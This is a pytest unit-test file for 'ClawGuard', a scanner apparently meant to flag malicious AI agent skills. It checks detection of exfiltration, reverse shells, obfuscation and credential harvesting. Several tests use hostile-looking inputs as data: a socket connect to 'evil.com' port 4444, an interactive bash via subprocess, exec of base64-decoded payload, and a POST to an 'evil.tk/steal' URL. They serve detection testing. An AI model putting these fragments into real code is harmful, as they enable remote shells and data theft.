"""
Unit tests for ClawGuard scanner.
"""

import pytest
from pathlib import Path

import sys
sys.path.insert(0, str(Path(__file__).parent.parent))

from engine.scanner import Scanner
from engine.models import Finding, ScanResult


class TestScanner:
    """Test the main Scanner class."""
    
    @pytest.fixture
    def scanner(self):
        return Scanner()
    
    @pytest.fixture
    def fixtures_path(self):
        return Path(__file__).parent / "fixtures"
    
    def test_clean_skill_is_safe(self, scanner, fixtures_path):
        """Clean skill should have no findings and risk score 0."""
        result = scanner.scan(fixtures_path / "clean_skill")
        
        assert result.risk_score == 0
        assert result.risk_level == "safe"
        assert len(result.findings) == 0
    
    def test_exfil_skill_is_critical(self, scanner, fixtures_path):
        """Data exfiltration skill should be flagged as critical."""
        result = scanner.scan(fixtures_path / "malicious_skill_exfil")
        
        assert result.risk_score >= 75
        assert result.risk_level in ["high", "critical"]
        assert len(result.findings) > 0
        
        # Should detect network/exfil patterns
        categories = {f.category for f in result.findings}
        assert "network" in categories
    
    def test_revshell_skill_is_critical(self, scanner, fixtures_path):
        """Reverse shell skill should be flagged as critical."""
        result = scanner.scan(fixtures_path / "malicious_skill_revshell")
        
        assert result.risk_score >= 75
        assert result.risk_level in ["high", "critical"]
        
        # Should detect remote_access patterns
        categories = {f.category for f in result.findings}
        assert "remote_access" in categories
    
    def test_obfuscated_skill_is_critical(self, scanner, fixtures_path):
        """Obfuscated skill should be flagged as critical."""
        result = scanner.scan(fixtures_path / "malicious_skill_obfuscated")
        
        assert result.risk_score >= 75
        assert result.risk_level in ["high", "critical"]
        
        # Should detect obfuscation patterns
        categories = {f.category for f in result.findings}
        assert "obfuscation" in categories or "code_execution" in categories
    
    def test_credential_skill_is_critical(self, scanner, fixtures_path):
        """Credential harvesting skill should be flagged as critical."""
        result = scanner.scan(fixtures_path / "malicious_skill_credential")
        
        assert result.risk_score >= 75
        assert result.risk_level in ["high", "critical"]
        
        # Should detect credential_harvest patterns
        categories = {f.category for f in result.findings}
        assert "credential_harvest" in categories
    
    def test_edge_case_skill_is_medium(self, scanner, fixtures_path):
        """Edge case skill should be medium risk (legitimate patterns)."""
        result = scanner.scan(fixtures_path / "edge_case_skill")
        
        # Should be flagged but not critical
        assert result.risk_score >= 25
        assert result.risk_score < 75
        assert result.risk_level in ["low", "medium"]
    
    def test_nonexistent_path(self, scanner):
        """Scanning nonexistent path should return empty result."""
        result = scanner.scan(Path("/nonexistent/path/to/skill"))
        
        assert result.files_scanned == 0
        assert len(result.findings) == 0
    
    def test_min_severity_filter(self, fixtures_path):
        """Minimum severity filter should work."""
        scanner_high = Scanner(min_severity="high")
        result = scanner_high.scan(fixtures_path / "edge_case_skill")
        
        # Should only have high+ severity findings
        for finding in result.findings:
            assert finding.severity in ["critical", "high"]


class TestPatternMatcher:
    """Test the pattern matcher."""
    
    def test_detects_socket_connect(self):
        from engine.pattern_matcher import PatternMatcher
        
        pm = PatternMatcher()
        code = 's.connect(("evil.com", 4444))'
        findings = pm.scan(code, "test.py")
        
        assert len(findings) > 0
        assert any("CH-001" in f.id for f in findings)
    
    def test_detects_subprocess_shell(self):
        from engine.pattern_matcher import PatternMatcher
        
        pm = PatternMatcher()
        code = 'subprocess.call(["/bin/bash", "-i"])'
        findings = pm.scan(code, "test.py")
        
        assert len(findings) > 0
    
    def test_detects_base64_exec(self):
        from engine.pattern_matcher import PatternMatcher
        
        pm = PatternMatcher()
        code = 'exec(base64.b64decode(payload))'
        findings = pm.scan(code, "test.py")
        
        assert len(findings) > 0
        assert any(f.severity == "critical" for f in findings)


class TestObfuscationDetector:
    """Test the obfuscation detector."""
    
    def test_detects_chr_obfuscation(self):
        from engine.obfuscation_detector import ObfuscationDetector
        
        od = ObfuscationDetector()
        code = 'x = chr(101) + chr(118) + chr(97) + chr(108)'
        findings = od.scan(code, "test.py")
        
        assert len(findings) > 0
        assert any("OBF" in f.id for f in findings)
    
    def test_detects_long_lines(self):
        from engine.obfuscation_detector import ObfuscationDetector
        
        od = ObfuscationDetector()
        code = 'x = "' + 'A' * 600 + '"'
        findings = od.scan(code, "test.py")
        
        assert any("OBF-004" in f.id for f in findings)


class TestNetworkAnalyzer:
    """Test the network analyzer."""
    
    def test_detects_url_shortener(self):
        from engine.network_analyzer import NetworkAnalyzer
        
        na = NetworkAnalyzer()
        code = 'requests.get("https://bit.ly/abc123")'
        findings = na.scan(code, "test.py")
        
        assert len(findings) > 0
        assert any("NET-001" in f.id for f in findings)
    
    def test_detects_suspicious_tld(self):
        from engine.network_analyzer import NetworkAnalyzer
        
        na = NetworkAnalyzer()
        code = 'requests.post("https://evil.tk/steal")'
        findings = na.scan(code, "test.py")
        
        assert len(findings) > 0
        assert any("NET-002" in f.id for f in findings)
    
    def test_ignores_localhost(self):
        from engine.network_analyzer import NetworkAnalyzer
        
        na = NetworkAnalyzer()
        code = 'requests.get("http://127.0.0.1:8000/api")'
        findings = na.scan(code, "test.py")
        
        # Should not flag localhost
        assert not any("NET-004" in f.id for f in findings)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
